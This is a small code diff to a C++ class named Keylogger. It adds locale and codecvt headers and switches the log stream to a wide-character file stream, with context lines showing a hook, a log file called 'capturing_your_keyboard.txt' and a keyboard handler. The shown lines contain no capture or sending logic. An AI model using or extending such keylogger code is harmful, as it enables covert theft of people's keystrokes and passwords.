@@ -13,6 +13,8 @@
 #include <memory>
 #include <ctime>
 #include <sstream>
+#include <codecvt>
+#include <locale>
 
 class Keylogger {
 public:
@@ -26,7 +28,7 @@ private:
 	const wstring FILENAME = L"capturing_your_keyboard.txt";
 	shared_ptr<Hook> hook;
 	bool isActive;
-	ofstream logFile;
+	std::wofstream logFile;
 	HWND lastActiveWindow;
 
 	void keyboardHandler(const wchar_t* key);
